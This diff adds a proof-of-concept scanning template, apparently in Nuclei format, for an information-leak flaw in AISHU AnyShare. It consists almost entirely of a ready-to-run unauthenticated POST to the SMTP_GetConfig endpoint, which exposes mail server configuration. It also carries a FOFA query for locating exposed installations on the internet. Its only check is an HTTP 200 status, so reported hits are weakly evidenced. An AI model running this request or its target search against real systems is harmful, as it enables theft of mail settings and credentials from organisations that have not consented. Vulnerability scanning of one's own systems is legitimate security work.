@@ -1,0 +1,25 @@
+id: poc-6523394585
+info:
+  name: 爱数AnyShare SMTP_GetConfig存在信息泄露漏洞_wxbc044rg5322iw3
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: info-leak,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: app="AISHU-AnyShare"
+http:
+- raw:
+  - 'POST /api/ShareMgnt/SMTP_GetConfig HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+    {}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
